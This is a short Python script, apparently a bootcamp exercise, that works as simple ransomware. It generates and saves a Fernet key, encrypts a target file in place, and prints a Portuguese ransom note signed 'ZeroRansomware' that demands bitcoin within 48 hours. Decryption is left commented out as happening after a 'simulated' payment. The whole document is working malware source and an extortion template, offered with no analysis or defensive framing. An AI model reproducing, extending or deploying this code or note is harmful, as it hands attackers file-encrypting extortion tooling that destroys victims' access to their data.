import os
from cryptography.fernet import Fernet

# Gera uma chave e a salva em um arquivo com o nome especificado
def gerar_chave():
    chave = Fernet.generate_key()
    with open('SaiForaZika.key', 'wb') as chave_arquivo:
        chave_arquivo.write(chave)

# Carrega a chave do arquivo especificado
def carregar_chave():
    return open('SaiForaZika.key', 'rb').read()

# Função para criptografar arquivos
def criptografar_arquivo(nome_arquivo):
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(nome_arquivo, 'rb') as arquivo:
        dados = arquivo.read()

    dados_encriptados = fernet.encrypt(dados)

    with open(nome_arquivo, 'wb') as arquivo:
        arquivo.write(dados_encriptados)

# Função para descriptografar arquivos
def descriptografar_arquivo(nome_arquivo):
    chave = carregar_chave()
    fernet = Fernet(chave)

    with open(nome_arquivo, 'rb') as arquivo:
        dados_encriptados = arquivo.read()

    dados_descriptografados = fernet.decrypt(dados_encriptados)

    with open(nome_arquivo, 'wb') as arquivo:
        arquivo.write(dados_descriptografados)

# Função para exibir a nota de resgate
def exibir_nota_resgate():
    nota = """
    Seus arquivos foram criptografados. Para recuperá-los, você deve pagar uma quantia em bitcoins para a carteira especificada.

    Siga as instruções abaixo:
    1. Compre Bitcoins.
    2. Envie a quantia exata para a carteira: BootCampDiO
    3. Após o pagamento, envie um email para example@domain.com com a confirmação.

    Você tem 48 horas para fazer o pagamento, caso contrário, seus arquivos serão permanentemente perdidos.

    - ZeroRansomware
    """
    print(nota)

# Exemplo de uso
gerar_chave()  # Gera e salva a chave com o nome especificado
criptografar_arquivo('exemplo.txt')  # Criptografa o arquivo
exibir_nota_resgate()  # Exibe a nota de resgate
# Para descriptografar (após o "pagamento" simulado)
# descriptografar_arquivo('exemplo.txt')
